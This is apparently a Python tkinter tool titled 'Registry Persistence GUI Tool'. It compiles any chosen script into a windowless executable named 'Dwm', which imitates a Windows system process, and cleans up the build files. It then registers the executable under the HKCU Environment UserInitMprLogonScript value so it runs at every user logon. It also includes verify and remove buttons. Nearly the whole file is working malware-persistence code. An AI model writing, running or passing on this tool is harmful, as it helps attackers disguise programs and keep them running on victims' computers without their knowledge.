import os
import shutil
import tkinter as tk
from tkinter import filedialog, messagebox
import subprocess
import winreg  # Windows-only

class PersistenceGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Registry Persistence GUI Tool")
        self.root.geometry("600x300")
        self.filename = ""
        self.exe_name = "Dwm"

        self.create_widgets()

    def create_widgets(self):
        self.file_label = tk.Label(self.root, text="Selected Python File: None")
        self.file_label.pack(pady=10)

        self.select_button = tk.Button(self.root, text="Select Python File", command=self.select_file)
        self.select_button.pack()

        self.build_button = tk.Button(self.root, text="Build Executable", command=self.build_exe)
        self.build_button.pack(pady=5)

        self.persist_button = tk.Button(self.root, text="Set Registry Persistence", command=self.set_persistence)
        self.persist_button.pack(pady=5)

        self.verify_button = tk.Button(self.root, text="Verify Persistence", command=self.verify_persistence)
        self.verify_button.pack(pady=5)

        self.remove_button = tk.Button(self.root, text="Remove Persistence", command=self.remove_persistence)
        self.remove_button.pack(pady=5)

    def select_file(self):
        self.filename = filedialog.askopenfilename(filetypes=[("Python Files", "*.py")])
        self.file_label.config(text=f"Selected File: {self.filename}")

    def build_exe(self):
        if not self.filename:
            messagebox.showerror("Error", "Please select a Python file first.")
            return

        try:
            subprocess.run([
                "pyinstaller", "--onefile", "--noconsole", f"--name={self.exe_name}", self.filename
            ], check=True)

            exe_path = os.path.join("dist", self.exe_name + ".exe")
            if os.path.exists(exe_path):
                shutil.move(exe_path, os.getcwd())
                messagebox.showinfo("Success", f"Executable created: {self.exe_name}.exe")

            for folder in ['dist', 'build', '__pycache__']:
                if os.path.isdir(folder):
                    shutil.rmtree(folder)
            spec_file = self.exe_name + ".spec"
            if os.path.exists(spec_file):
                os.remove(spec_file)

        except Exception as e:
            messagebox.showerror("Build Error", str(e))

    def set_persistence(self):
        try:
            exe_path = os.path.abspath(self.exe_name + ".exe")
            reg_path = r"Environment"
            reg = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
            key = winreg.OpenKey(reg, reg_path, 0, winreg.KEY_WRITE)
            winreg.SetValueEx(key, "UserInitMprLogonScript", 0, winreg.REG_SZ, exe_path)
            messagebox.showinfo("Persistence", "Registry persistence set successfully.")
        except Exception as e:
            messagebox.showerror("Registry Error", str(e))

    def verify_persistence(self):
        try:
            reg_path = r"Environment"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_READ)
            value, regtype = winreg.QueryValueEx(key, "UserInitMprLogonScript")
            messagebox.showinfo("Verification", f"Persistence Found:\nUserInitMprLogonScript = {value}")
        except FileNotFoundError:
            messagebox.showinfo("Verification", "No persistence entry found.")
        except Exception as e:
            messagebox.showerror("Verification Error", str(e))

    def remove_persistence(self):
        try:
            reg_path = r"Environment"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE)
            winreg.DeleteValue(key, "UserInitMprLogonScript")
            messagebox.showinfo("Removal", "Persistence registry entry removed.")
        except FileNotFoundError:
            messagebox.showinfo("Removal", "No persistence entry to remove.")
        except Exception as e:
            messagebox.showerror("Removal Error", str(e))

if __name__ == "__main__":
    root = tk.Tk()
    app = PersistenceGUI(root)
    root.mainloop()
